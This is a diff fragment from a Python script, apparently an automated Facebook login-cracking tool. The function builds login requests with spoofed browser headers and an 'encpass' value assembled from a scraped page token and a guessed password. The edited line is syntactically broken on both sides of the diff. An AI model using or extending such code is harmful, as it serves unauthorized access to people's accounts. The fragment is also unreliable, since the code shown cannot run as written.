@@ -813,7 +813,7 @@ def _M8_(ids,pasx):
                         'email': ids, 
                         'login_source': 'comet_headerless_login', 
                         'next': '', 
-                        'encpass': '#PWD_BROWSER':0:re.search('name="lgnjs" value="(.*?)"', str(BLACKX)).group(1),:ps}
+                        'encpass': '#PWD_BROWSER':'0':re.search('name="lgnjs" value="(.*?)"', str(BLACKX)).group(1),:ps}
                         tedy ={'authority': 'web.facebook.com', 
                         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
                         'accept-language': 'en-US,en;q=0.9', 
